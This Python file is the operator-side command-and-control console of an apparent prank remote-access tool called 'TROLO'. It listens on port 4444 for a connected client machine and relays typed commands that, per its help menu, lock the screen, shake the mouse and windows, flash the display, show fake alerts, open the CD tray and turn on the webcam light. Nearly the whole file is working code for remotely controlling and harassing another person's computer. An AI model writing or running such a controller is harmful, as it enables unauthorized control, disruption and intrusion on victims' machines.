import socket
import struct
from colorama import Fore, init
import os

init()

SERVER = ""
PORT = 4444

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((SERVER, PORT))
s.listen(1)

def title():
    os.system('clear || cls')
    print(
        f'''
 ███████████ ███████████      ███████    █████          ███████   
░█░░░███░░░█░░███░░░░░███   ███░░░░░███ ░░███         ███░░░░░███ 
░   ░███  ░  ░███    ░███  ███     ░░███ ░███        ███     ░░███
    ░███     ░██████████  ░███      ░███ ░███       ░███      ░███
    ░███     ░███░░░░░███ ░███      ░███ ░███       ░███      ░███
    ░███     ░███    ░███ ░░███     ███  ░███      █░░███     ███ 
    █████    █████   █████ ░░░███████░   ███████████ ░░░███████░  
   ░░░░░    ░░░░░   ░░░░░    ░░░░░░░    ░░░░░░░░░░░    ░░░░░░░                                                                                                                        
        '''.replace("█", f"{Fore.LIGHTWHITE_EX}█{Fore.LIGHTBLACK_EX}")
        
     )

HELP_MENU = f"""
{Fore.LIGHTGREEN_EX}Commands{Fore.LIGHTWHITE_EX}
========
  msgbox        <MESSAGE>      Show a fake alert message
  beep          <NUMBER>       Play random beep sounds
  mouse         <NUMBER>       Move mouse randomly
  screenlock    <NUMBER>       Lock screen
  led           <NUMBER>       Flash the keyboard LEDs on and off
  errorsound    <NUMBER>       Trigger Windows error noise
  shakymouse    <NUMBER>       Shake the mouse
  background    <NUMBER>       Flash the screen by changing wallpaper rapidly
  flash         <NUMBER>       Turn off the screen and turn it back on
  opencd                       Open and close the CD/DVD tray
  notification  <MESSAGE>      Put a notification
  webcam        <NUMBER>       Turn on the webcam light
  robot                        Make the computer speak
  notepad       <MESSAGE>      Launch the NOTEPAD application and post a message
  theme         <light/dark>   Change color
  shake         <NUMBER>       Shake the open windows
  flip          <NUMBER>       Screen that flips every second

{Fore.LIGHTGREEN_EX}Other{Fore.LIGHTWHITE_EX}
=====
  help                         Show this menu
  quit                         Close connection
"""

while True:
    print(f'{Fore.LIGHTBLACK_EX}[*]{Fore.LIGHTWHITE_EX} Listening on {SERVER}:{PORT}')
    client, addr = s.accept()
    print(f'{Fore.LIGHTWHITE_EX}[+] Client connected: {Fore.LIGHTCYAN_EX}{addr}')
    client.send('Connected to server'.encode())
    title()
    while True:
        cmd = input(f'{Fore.LIGHTWHITE_EX}remote{Fore.LIGHTBLACK_EX}>{Fore.WHITE} ').strip()
        if not cmd:
            continue
        if cmd.lower() == "help":
            print(HELP_MENU)
            continue
        client.send(cmd.encode())
        if cmd.lower() in ['q', 'quit', 'exit']:
            break
        data_size = struct.unpack(">I", client.recv(4))[0]
        result = b""
        while len(result) < data_size:
            result += client.recv(1024)
    client.close()
    if input('Wait for new client? (y/n) ') in ['n', 'no']:
        break
s.close()
